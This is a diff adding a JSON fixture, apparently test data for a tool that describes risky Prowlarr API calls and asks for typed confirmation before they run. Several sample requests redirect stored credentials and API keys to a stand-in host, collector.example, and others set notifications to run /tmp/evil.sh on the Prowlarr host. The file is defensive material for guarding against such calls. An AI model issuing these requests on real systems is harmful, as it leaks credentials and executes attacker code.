@@ -1,0 +1,470 @@
+{
+  "DELETE /api/v1/applications/bulk": {
+    "confirmLiteral": "1 application",
+    "resolved": "DELETE /api/v1/applications/bulk",
+    "targets": [
+      {
+        "id": "4",
+        "kind": "applications",
+        "name": "applications Sonarr (Sonarr)"
+      }
+    ],
+    "text": "Prowlarr DELETE /api/v1/applications/bulk on applications Sonarr (Sonarr) {\"ids\":[4]}"
+  },
+  "DELETE /api/v1/downloadclient/bulk": {
+    "confirmLiteral": "1 download client",
+    "resolved": "DELETE /api/v1/downloadclient/bulk",
+    "targets": [
+      {
+        "id": "6",
+        "kind": "downloadclient",
+        "name": "downloadclient qBit (QBittorrent)"
+      }
+    ],
+    "text": "Prowlarr DELETE /api/v1/downloadclient/bulk on downloadclient qBit (QBittorrent) {\"ids\":[6]}"
+  },
+  "DELETE /api/v1/indexer/bulk": {
+    "confirmLiteral": "2 indexers",
+    "resolved": "DELETE /api/v1/indexer/bulk",
+    "targets": [
+      {
+        "id": "1",
+        "kind": "indexer",
+        "name": "indexer NZBgeek (Newznab)"
+      },
+      {
+        "id": "2",
+        "kind": "indexer",
+        "name": "indexer PrivateHD (Cardigann)"
+      }
+    ],
+    "text": "Prowlarr DELETE /api/v1/indexer/bulk on indexer NZBgeek (Newznab); indexer PrivateHD (Cardigann) {\"ids\":[1,2]}"
+  },
+  "POST /api/v1/applications/action/{name}#stored": {
+    "confirmLiteral": "Sonarr",
+    "resolved": "POST /api/v1/applications/action/{name}#stored",
+    "targets": [
+      {
+        "id": "4",
+        "kind": "applications",
+        "name": "applications Sonarr (Sonarr) → https://collector.example:443"
+      }
+    ],
+    "text": "Prowlarr POST /api/v1/applications/action/getCategories on applications Sonarr (Sonarr) → https://collector.example:443 {\"id\":4,\"name\":\"Sonarr\",\"implementation\":\"Sonarr\",\"enable\":true,\"fields\":\"[REDACTED]\"} (sends the stored credentials to a destination other than the stored one) (the application gets Prowlarr's indexers and API key)"
+  },
+  "POST /api/v1/applications/test#stored": {
+    "confirmLiteral": "Sonarr",
+    "resolved": "POST /api/v1/applications/test#stored",
+    "targets": [
+      {
+        "id": "4",
+        "kind": "applications",
+        "name": "applications Sonarr (Sonarr) → https://collector.example:443"
+      }
+    ],
+    "text": "Prowlarr POST /api/v1/applications/test on applications Sonarr (Sonarr) → https://collector.example:443 {\"id\":4,\"name\":\"Sonarr\",\"implementation\":\"Sonarr\",\"enable\":true,\"fields\":\"[REDACTED]\"} (sends the stored credentials to a destination other than the stored one) (the application gets Prowlarr's indexers and API key)"
+  },
+  "POST /api/v1/applications/testall": {
+    "confirmLiteral": "Home Prowlarr",
+    "resolved": "POST /api/v1/applications/testall",
+    "targets": [],
+    "text": "Prowlarr POST /api/v1/applications/testall (sends Prowlarr's API key to every stored application)"
+  },
+  "POST /api/v1/command#heavy": {
+    "confirmLiteral": "ApplicationIndexerSync",
+    "resolved": "POST /api/v1/command#heavy",
+    "targets": [],
+    "text": "Prowlarr POST /api/v1/command {\"name\":\"ApplicationIndexerSync\",\"forceSync\":true} (syncs applications, clears data, or changes the application)"
+  },
+  "POST /api/v1/downloadclient#folder": {
+    "confirmLiteral": "Drop",
+    "resolved": "POST /api/v1/downloadclient#folder",
+    "targets": [
+      {
+        "id": "new",
+        "kind": "downloadclient",
+        "name": "downloadclient Drop (TorrentBlackhole), writes to /tmp/drop, /tmp/w"
+      }
+    ],
+    "text": "Prowlarr POST /api/v1/downloadclient on downloadclient Drop (TorrentBlackhole), writes to /tmp/drop, /tmp/w {\"name\":\"Drop\",\"implementation\":\"TorrentBlackhole\",\"enable\":true,\"fields\":\"[REDACTED]\"} (writes files to a folder on the Prowlarr host)"
+  },
+  "POST /api/v1/downloadclient/action/{name}#folder": {
+    "confirmLiteral": "qBit",
+    "resolved": "POST /api/v1/downloadclient/action/{name}#folder",
+    "targets": [
+      {
+        "id": "6",
+        "kind": "downloadclient",
+        "name": "downloadclient qBit (TorrentBlackhole) → http://qbittorrent.lan:8080, writes to /tmp/drop, /tmp/w"
+      }
+    ],
+    "text": "Prowlarr POST /api/v1/downloadclient/action/getCategories on downloadclient qBit (TorrentBlackhole) → http://qbittorrent.lan:8080, writes to /tmp/drop, /tmp/w {\"id\":6,\"name\":\"Drop\",\"implementation\":\"TorrentBlackhole\",\"enable\":true,\"fields\":\"[REDACTED]\"} (writes files to a folder on the Prowlarr host)"
+  },
+  "POST /api/v1/downloadclient/action/{name}#stored": {
+    "confirmLiteral": "qBit",
+    "resolved": "POST /api/v1/downloadclient/action/{name}#stored",
+    "targets": [
+      {
+        "id": "6",
+        "kind": "downloadclient",
+        "name": "downloadclient qBit (QBittorrent) → https://collector.example:443"
+      }
+    ],
+    "text": "Prowlarr POST /api/v1/downloadclient/action/getCategories on downloadclient qBit (QBittorrent) → https://collector.example:443 {\"id\":6,\"name\":\"qBit\",\"implementation\":\"QBittorrent\",\"enable\":true,\"fields\":\"[REDACTED]\"} (sends the stored credentials to a destination other than the stored one)"
+  },
+  "POST /api/v1/downloadclient/test#folder": {
+    "confirmLiteral": "Drop",
+    "resolved": "POST /api/v1/downloadclient/test#folder",
+    "targets": [
+      {
+        "id": "new",
+        "kind": "downloadclient",
+        "name": "downloadclient Drop (TorrentBlackhole), writes to /tmp/drop, /tmp/w"
+      }
+    ],
+    "text": "Prowlarr POST /api/v1/downloadclient/test on downloadclient Drop (TorrentBlackhole), writes to /tmp/drop, /tmp/w {\"name\":\"Drop\",\"implementation\":\"TorrentBlackhole\",\"enable\":true,\"fields\":\"[REDACTED]\"} (writes files to a folder on the Prowlarr host)"
+  },
+  "POST /api/v1/downloadclient/test#stored": {
+    "confirmLiteral": "qBit",
+    "resolved": "POST /api/v1/downloadclient/test#stored",
+    "targets": [
+      {
+        "id": "6",
+        "kind": "downloadclient",
+        "name": "downloadclient qBit (QBittorrent) → https://collector.example:443"
+      }
+    ],
+    "text": "Prowlarr POST /api/v1/downloadclient/test on downloadclient qBit (QBittorrent) → https://collector.example:443 {\"id\":6,\"name\":\"qBit\",\"implementation\":\"QBittorrent\",\"enable\":true,\"fields\":\"[REDACTED]\"} (sends the stored credentials to a destination other than the stored one)"
+  },
+  "POST /api/v1/indexer/action/{name}#stored": {
+    "confirmLiteral": "PrivateHD",
+    "resolved": "POST /api/v1/indexer/action/{name}#stored",
+    "targets": [
+      {
+        "id": "2",
+        "kind": "indexer",
+        "name": "indexer PrivateHD (Cardigann) → https://collector.example:443"
+      }
+    ],
+    "text": "Prowlarr POST /api/v1/indexer/action/getCategories on indexer PrivateHD (Cardigann) → https://collector.example:443 {\"id\":2,\"name\":\"PrivateHD\",\"implementation\":\"Cardigann\",\"enable\":true,\"fields\":\"[REDACTED]\"} (sends the stored credentials to a destination other than the stored one)"
+  },
+  "POST /api/v1/indexer/test#stored": {
+    "confirmLiteral": "PrivateHD",
+    "resolved": "POST /api/v1/indexer/test#stored",
+    "targets": [
+      {
+        "id": "2",
+        "kind": "indexer",
+        "name": "indexer PrivateHD (Cardigann) → https://collector.example:443"
+      }
+    ],
+    "text": "Prowlarr POST /api/v1/indexer/test on indexer PrivateHD (Cardigann) → https://collector.example:443 {\"id\":2,\"name\":\"PrivateHD\",\"implementation\":\"Cardigann\",\"enable\":true,\"fields\":\"[REDACTED]\"} (sends the stored credentials to a destination other than the stored one)"
+  },
+  "POST /api/v1/indexerproxy": {
+    "resolved": "POST /api/v1/indexerproxy",
+    "targets": [
+      {
+        "id": "new",
+        "kind": "indexerproxy",
+        "name": "indexerproxy VPN (Socks5) → http://vpn.lan"
+      },
+      {
+        "id": "2",
+        "kind": "indexer",
+        "name": "routes indexer PrivateHD (https://privatehd.example)"
+      },
+      {
+        "id": "3",
+        "kind": "indexer",
+        "name": "routes indexer Tracker RSS (https://tracker.example)"
+      }
+    ],
+    "text": "Prowlarr POST /api/v1/indexerproxy on indexerproxy VPN (Socks5) → http://vpn.lan; routes indexer PrivateHD (https://privatehd.example); routes indexer Tracker RSS (https://tracker.example) {\"name\":\"VPN\",\"implementation\":\"Socks5\",\"tags\":[16],\"fields\":\"[REDACTED]\"} (traffic of every indexer with one of these tags goes through this proxy)"
+  },
+  "POST /api/v1/indexerproxy/action/{name}#stored": {
+    "confirmLiteral": "Socks",
+    "resolved": "POST /api/v1/indexerproxy/action/{name}#stored",
+    "targets": [
+      {
+        "id": "10",
+        "kind": "indexerproxy",
+        "name": "indexerproxy Socks (Socks5) → https://collector.example:443"
+      }
+    ],
+    "text": "Prowlarr POST /api/v1/indexerproxy/action/getCategories on indexerproxy Socks (Socks5) → https://collector.example:443 {\"id\":10,\"name\":\"Socks\",\"implementation\":\"Socks5\",\"enable\":true,\"fields\":\"[REDACTED]\"} (sends the stored credentials to a destination other than the stored one)"
+  },
+  "POST /api/v1/indexerproxy/test#stored": {
+    "confirmLiteral": "Socks",
+    "resolved": "POST /api/v1/indexerproxy/test#stored",
+    "targets": [
+      {
+        "id": "10",
+        "kind": "indexerproxy",
+        "name": "indexerproxy Socks (Socks5) → https://collector.example:443"
+      }
+    ],
+    "text": "Prowlarr POST /api/v1/indexerproxy/test on indexerproxy Socks (Socks5) → https://collector.example:443 {\"id\":10,\"name\":\"Socks\",\"implementation\":\"Socks5\",\"enable\":true,\"fields\":\"[REDACTED]\"} (sends the stored credentials to a destination other than the stored one)"
+  },
+  "POST /api/v1/notification#script": {
+    "confirmLiteral": "Run it",
+    "resolved": "POST /api/v1/notification#script",
+    "targets": [
+      {
+        "id": "new",
+        "kind": "notification",
+        "name": "notification Run it (CustomScript), runs /tmp/evil.sh"
+      }
+    ],
+    "text": "Prowlarr POST /api/v1/notification on notification Run it (CustomScript), runs /tmp/evil.sh {\"name\":\"Run it\",\"implementation\":\"CustomScript\",\"enable\":true,\"fields\":\"[REDACTED]\"} (runs a program on the Prowlarr host)"
+  },
+  "POST /api/v1/notification/action/{name}#script": {
+    "confirmLiteral": "Discord",
+    "resolved": "POST /api/v1/notification/action/{name}#script",
+    "targets": [
+      {
+        "id": "9",
+        "kind": "notification",
+        "name": "notification Discord (CustomScript) → https://discord.com, runs /tmp/evil.sh"
+      }
+    ],
+    "text": "Prowlarr POST /api/v1/notification/action/getDevices on notification Discord (CustomScript) → https://discord.com, runs /tmp/evil.sh {\"id\":9,\"name\":\"Discord\",\"implementation\":\"CustomScript\",\"enable\":true,\"fields\":\"[REDACTED]\"} (runs a program on the Prowlarr host)"
+  },
+  "POST /api/v1/notification/action/{name}#stored": {
+    "confirmLiteral": "Discord",
+    "resolved": "POST /api/v1/notification/action/{name}#stored",
+    "targets": [
+      {
+        "id": "9",
+        "kind": "notification",
+        "name": "notification Discord (Discord) → https://collector.example:443"
+      }
+    ],
+    "text": "Prowlarr POST /api/v1/notification/action/getCategories on notification Discord (Discord) → https://collector.example:443 {\"id\":9,\"name\":\"Discord\",\"implementation\":\"Discord\",\"enable\":true,\"fields\":\"[REDACTED]\"} (sends the stored credentials to a destination other than the stored one)"
+  },
+  "POST /api/v1/notification/test#script": {
+    "confirmLiteral": "New",
+    "resolved": "POST /api/v1/notification/test#script",
+    "targets": [
+      {
+        "id": "new",
+        "kind": "notification",
+        "name": "notification New (Webhook) → https://h.example, runs /tmp/evil.sh"
+      }
+    ],
+    "text": "Prowlarr POST /api/v1/notification/test on notification New (Webhook) → https://h.example, runs /tmp/evil.sh {\"name\":\"New\",\"implementation\":\"Webhook\",\"enable\":true,\"fields\":\"[REDACTED]\"} (runs a program on the Prowlarr host)"
+  },
+  "POST /api/v1/notification/test#stored": {
+    "confirmLiteral": "Discord",
+    "resolved": "POST /api/v1/notification/test#stored",
+    "targets": [
+      {
+        "id": "9",
+        "kind": "notification",
+        "name": "notification Discord (Discord) → https://collector.example:443"
+      }
+    ],
+    "text": "Prowlarr POST /api/v1/notification/test on notification Discord (Discord) → https://collector.example:443 {\"id\":9,\"name\":\"Discord\",\"implementation\":\"Discord\",\"enable\":true,\"fields\":\"[REDACTED]\"} (sends the stored credentials to a destination other than the stored one)"
+  },
+  "POST /api/v1/notification/testall#script": {
+    "confirmLiteral": "Home Prowlarr",
+    "resolved": "POST /api/v1/notification/testall#script",
+    "targets": [],
+    "text": "Prowlarr POST /api/v1/notification/testall (runs a program on the Prowlarr host)"
+  },
+  "POST /api/v1/search": {
+    "resolved": "POST /api/v1/search",
+    "targets": [
+      {
+        "id": "nzbgeek-guid-1",
+        "kind": "release",
+        "name": "release nzbgeek-guid-1 (\"Dune.2021.1080p\") → download client qBit (from NZBgeek)"
+      }
+    ],
+    "text": "Prowlarr POST /api/v1/search on release nzbgeek-guid-1 (\"Dune.2021.1080p\") → download client qBit (from NZBgeek) {\"guid\":\"nzbgeek-guid-1\",\"indexerId\":1,\"title\":\"Dune.2021.1080p\",\"downloadClientId\":6}"
+  },
+  "POST /api/v1/search/bulk": {
+    "resolved": "POST /api/v1/search/bulk",
+    "targets": [
+      {
+        "id": "nzbgeek-guid-1",
+        "kind": "release",
+        "name": "release nzbgeek-guid-1 (\"Dune.2021.1080p\") → the default download client (from NZBgeek)"
+      },
+      {
+        "id": "privatehd-guid-7",
+        "kind": "release",
+        "name": "release privatehd-guid-7 (\"Dune.2021.2160p\") → download client qBit (from PrivateHD)"
+      }
+    ],
+    "text": "Prowlarr POST /api/v1/search/bulk on release nzbgeek-guid-1 (\"Dune.2021.1080p\") → the default download client (from NZBgeek); release privatehd-guid-7 (\"Dune.2021.2160p\") → download client qBit (from PrivateHD) [{\"guid\":\"nzbgeek-guid-1\",\"indexerId\":1,\"title\":\"Dune.2021.1080p\"},{\"guid\":\"privatehd-guid-7\",\"indexerId\":2,\"title\":\"Dune.2021.2160p\"}]"
+  },
+  "POST /api/v1/system/backup/restore/{id}": {
+    "confirmLiteral": "prowlarr_backup_v2.6.5.5623_2026.10.15_10.00.00.zip",
+    "resolved": "POST /api/v1/system/backup/restore/{id}",
+    "targets": [],
+    "text": "Prowlarr POST /api/v1/system/backup/restore/21 (replaces the database and settings, then restarts)"
+  },
+  "POST /api/v1/system/restart": {
+    "confirmLiteral": "Home Prowlarr",
+    "resolved": "POST /api/v1/system/restart",
+    "targets": [],
+    "text": "Prowlarr POST /api/v1/system/restart"
+  },
+  "POST /api/v1/system/shutdown": {
+    "confirmLiteral": "Home Prowlarr",
+    "resolved": "POST /api/v1/system/shutdown",
+    "targets": [],
+    "text": "Prowlarr POST /api/v1/system/shutdown"
+  },
+  "PUT /api/v1/applications/bulk": {
+    "confirmLiteral": "1 application",
+    "resolved": "PUT /api/v1/applications/bulk",
+    "targets": [
+      {
+        "id": "4",
+        "kind": "applications",
+        "name": "applications Sonarr (Sonarr)"
+      }
+    ],
+    "text": "Prowlarr PUT /api/v1/applications/bulk on applications Sonarr (Sonarr) {\"ids\":[4],\"syncLevel\":\"fullSync\"}"
+  },
+  "PUT /api/v1/applications/{id}#stored": {
+    "confirmLiteral": "Sonarr",
+    "resolved": "PUT /api/v1/applications/{id}#stored",
+    "targets": [
+      {
+        "id": "4",
+        "kind": "applications",
+        "name": "applications Sonarr (Sonarr) → https://collector.example:443"
+      }
+    ],
+    "text": "Prowlarr PUT /api/v1/applications/4 on applications Sonarr (Sonarr) → https://collector.example:443 {\"id\":4,\"name\":\"Sonarr\",\"implementation\":\"Sonarr\",\"enable\":true,\"fields\":\"[REDACTED]\"} (sends the stored credentials to a destination other than the stored one)"
+  },
+  "PUT /api/v1/config/development/{id}": {
+    "confirmLiteral": "Home Prowlarr",
+    "resolved": "PUT /api/v1/config/development/{id}",
+    "targets": [],
+    "text": "Prowlarr PUT /api/v1/config/development/1 {\"id\":1,\"logIndexerResponse\":true,\"logSql\":true} (logging of indexer responses and SQL to the log files)"
+  },
+  "PUT /api/v1/config/host/{id}": {
+    "confirmLiteral": "Home Prowlarr",
+    "resolved": "PUT /api/v1/config/host/{id}",
+    "targets": [],
+    "text": "Prowlarr PUT /api/v1/config/host/1 {\"id\":1,\"bindAddress\":\"*\",\"urlBase\":\"/prowlarr\"} (sign-in, bind address, port, URL base, proxy and update script)"
+  },
+  "PUT /api/v1/downloadclient/{id}#folder": {
+    "confirmLiteral": "qBit",
+    "resolved": "PUT /api/v1/downloadclient/{id}#folder",
+    "targets": [
+      {
+        "id": "6",
+        "kind": "downloadclient",
+        "name": "downloadclient qBit (TorrentBlackhole) → http://qbittorrent.lan:8080, writes to /tmp/drop, /tmp/w"
+      }
+    ],
+    "text": "Prowlarr PUT /api/v1/downloadclient/6 on downloadclient qBit (TorrentBlackhole) → http://qbittorrent.lan:8080, writes to /tmp/drop, /tmp/w {\"id\":6,\"name\":\"Drop\",\"implementation\":\"TorrentBlackhole\",\"enable\":true,\"fields\":\"[REDACTED]\"} (writes files to a folder on the Prowlarr host)"
+  },
+  "PUT /api/v1/downloadclient/{id}#stored": {
+    "confirmLiteral": "qBit",
+    "resolved": "PUT /api/v1/downloadclient/{id}#stored",
+    "targets": [
+      {
+        "id": "6",
+        "kind": "downloadclient",
+        "name": "downloadclient qBit (QBittorrent) → https://collector.example:443"
+      }
+    ],
+    "text": "Prowlarr PUT /api/v1/downloadclient/6 on downloadclient qBit (QBittorrent) → https://collector.example:443 {\"id\":6,\"name\":\"qBit\",\"implementation\":\"QBittorrent\",\"enable\":true,\"fields\":\"[REDACTED]\"} (sends the stored credentials to a destination other than the stored one)"
+  },
+  "PUT /api/v1/indexer/bulk": {
+    "confirmLiteral": "2 indexers",
+    "resolved": "PUT /api/v1/indexer/bulk",
+    "targets": [
+      {
+        "id": "1",
+        "kind": "indexer",
+        "name": "indexer NZBgeek (Newznab)"
+      },
+      {
+        "id": "2",
+        "kind": "indexer",
+        "name": "indexer PrivateHD (Cardigann)"
+      }
+    ],
+    "text": "Prowlarr PUT /api/v1/indexer/bulk on indexer NZBgeek (Newznab); indexer PrivateHD (Cardigann) {\"ids\":[1,2],\"tags\":[12],\"applyTags\":\"add\"}"
+  },
+  "PUT /api/v1/indexer/{id}#stored": {
+    "confirmLiteral": "PrivateHD",
+    "resolved": "PUT /api/v1/indexer/{id}#stored",
+    "targets": [
+      {
+        "id": "2",
+        "kind": "indexer",
+        "name": "indexer PrivateHD (Cardigann) → https://collector.example:443"
+      }
+    ],
+    "text": "Prowlarr PUT /api/v1/indexer/2 on indexer PrivateHD (Cardigann) → https://collector.example:443 {\"id\":2,\"name\":\"PrivateHD\",\"implementation\":\"Cardigann\",\"enable\":true,\"fields\":\"[REDACTED]\"} (sends the stored credentials to a destination other than the stored one)"
+  },
+  "PUT /api/v1/indexerproxy/{id}": {
+    "resolved": "PUT /api/v1/indexerproxy/{id}",
+    "targets": [
+      {
+        "id": "5",
+        "kind": "indexerproxy",
+        "name": "indexerproxy FlareSolverr (FlareSolverr) → http://flaresolverr:8191"
+      },
+      {
+        "id": "1",
+        "kind": "indexer",
+        "name": "routes indexer NZBgeek (https://api.nzbgeek.info)"
+      },
+      {
+        "id": "2",
+        "kind": "indexer",
+        "name": "routes indexer PrivateHD (https://privatehd.example)"
+      }
+    ],
+    "text": "Prowlarr PUT /api/v1/indexerproxy/5 on indexerproxy FlareSolverr (FlareSolverr) → http://flaresolverr:8191; routes indexer NZBgeek (https://api.nzbgeek.info); routes indexer PrivateHD (https://privatehd.example) {\"id\":5,\"name\":\"Renamed\",\"implementation\":\"FlareSolverr\",\"tags\":[12],\"fields\":\"[REDACTED]\"} (traffic of every indexer with one of these tags goes through this proxy)"
+  },
+  "PUT /api/v1/indexerproxy/{id}#stored": {
+    "confirmLiteral": "Socks",
+    "resolved": "PUT /api/v1/indexerproxy/{id}#stored",
+    "targets": [
+      {
+        "id": "10",
+        "kind": "indexerproxy",
+        "name": "indexerproxy Socks (Socks5) → https://collector.example:443"
+      },
+      {
+        "id": "unknown",
+        "kind": "indexer",
+        "name": "indexers routed through it: unknown (the body has no list of tag ids)"
+      }
+    ],
+    "text": "Prowlarr PUT /api/v1/indexerproxy/10 on indexerproxy Socks (Socks5) → https://collector.example:443; indexers routed through it: unknown (the body has no list of tag ids) {\"id\":10,\"name\":\"Socks\",\"implementation\":\"Socks5\",\"enable\":true,\"fields\":\"[REDACTED]\"} (sends the stored credentials to a destination other than the stored one)"
+  },
+  "PUT /api/v1/notification/{id}#script": {
+    "confirmLiteral": "Discord",
+    "resolved": "PUT /api/v1/notification/{id}#script",
+    "targets": [
+      {
+        "id": "9",
+        "kind": "notification",
+        "name": "notification Discord (CustomScript) → https://discord.com, runs /tmp/evil.sh"
+      }
+    ],
+    "text": "Prowlarr PUT /api/v1/notification/9 on notification Discord (CustomScript) → https://discord.com, runs /tmp/evil.sh {\"id\":9,\"name\":\"Renamed\",\"implementation\":\"CustomScript\",\"enable\":true,\"fields\":\"[REDACTED]\"} (runs a program on the Prowlarr host)"
+  },
+  "PUT /api/v1/notification/{id}#stored": {
+    "confirmLiteral": "Discord",
+    "resolved": "PUT /api/v1/notification/{id}#stored",
+    "targets": [
+      {
+        "id": "9",
+        "kind": "notification",
+        "name": "notification Discord (Discord) → https://collector.example:443"
+      }
+    ],
+    "text": "Prowlarr PUT /api/v1/notification/9 on notification Discord (Discord) → https://collector.example:443 {\"id\":9,\"name\":\"Discord\",\"implementation\":\"Discord\",\"enable\":true,\"fields\":\"[REDACTED]\"} (sends the stored credentials to a destination other than the stored one)"
+  }
+}
